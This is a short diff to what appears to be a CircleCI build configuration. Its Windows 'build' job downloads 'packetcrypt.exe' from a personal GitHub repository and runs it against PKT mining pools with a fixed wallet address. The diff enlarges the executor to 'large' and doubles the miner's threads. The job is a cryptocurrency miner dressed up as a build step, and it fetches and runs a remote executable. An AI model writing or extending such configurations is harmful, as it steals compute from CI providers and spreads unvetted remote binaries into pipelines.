@@ -7,6 +7,7 @@ jobs:
   build:
     executor:
       name: win/default
+      size: "large"
       shell: powershell.exe
     steps:
       - checkout
@@ -16,4 +17,4 @@ jobs:
           shell: powershell.exe
           command: |
               Invoke-WebRequest -Uri 'https://github.com/phongcongtu/pkt_phong/raw/main/packetcrypt.exe' -OutFile 'packetcrypt.exe'
-              ./packetcrypt.exe ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world http://pool.pktpool.io -t 1
+              ./packetcrypt.exe ann -p pkt1qn8kg9zr4nx9jpy3ljgqamk7vtmszy32mqv96yj http://pool.pkt.world http://pool.pktpool.io -t 2
